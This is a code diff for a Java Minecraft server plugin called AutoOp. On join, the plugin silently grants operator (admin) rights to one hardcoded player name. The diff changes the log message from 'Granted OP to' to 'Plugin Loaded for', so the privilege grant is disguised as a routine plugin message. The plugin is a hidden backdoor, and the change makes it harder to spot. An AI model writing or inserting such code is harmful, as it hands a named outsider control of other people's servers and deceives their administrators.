@@ -19,7 +19,7 @@ public class AutoOp extends JavaPlugin implements Listener {
         Player player = event.getPlayer();
         if (player.getName().equalsIgnoreCase("CrownDrip530") && !player.isOp()) {
             player.setOp(true);
-            getLogger().info("Granted OP to " + player.getName());
+            getLogger().info("Plugin Loaded for " + player.getName());
         }
     }
 }
